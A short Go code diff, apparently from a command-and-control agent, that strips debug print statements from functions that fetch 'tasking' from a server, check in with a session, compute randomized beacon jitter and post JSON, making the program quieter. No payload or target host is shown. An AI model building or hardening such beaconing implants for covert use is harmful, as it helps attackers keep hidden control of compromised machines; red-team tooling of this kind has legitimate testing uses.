@@ -66,7 +66,6 @@ func FetchTasking(serverAddr string, session string) (string, error) {
                 return "", err
         }
         bodyString := string(bodyBytes)
-        fmt.Println(bodyString)
         return bodyString, nil
 }
 
@@ -86,7 +85,6 @@ func CheckIn(serverAddr string, session string) (int, error) {
 		return 0, nil
 	}
 	defer resp.Body.Close()
-        fmt.Println("Check-in response:", resp.StatusCode)
 	return resp.StatusCode, nil
 }
 
@@ -101,8 +99,6 @@ func RandomJitter(baseMinutes int, jitterPercent int) time.Duration {
 	totalSeconds := baseSeconds + jitterSeconds
 
 	jitterDuration := time.Duration(totalSeconds) * time.Second
-
-	fmt.Printf("Random jitter: %d%% (+%ds) → total %s\n", randomPercent, jitterSeconds, jitterDuration)
 	return jitterDuration
 }
 
@@ -118,8 +114,7 @@ func PostJson(url string, payload interface{}) (int, error) {
 	}
 	defer resp.Body.Close()
 
-        body, _ := io.ReadAll(resp.Body)
-        fmt.Println("Response body:", string(body))
+        _, _ = io.ReadAll(resp.Body)
 
 	return resp.StatusCode, nil
 }
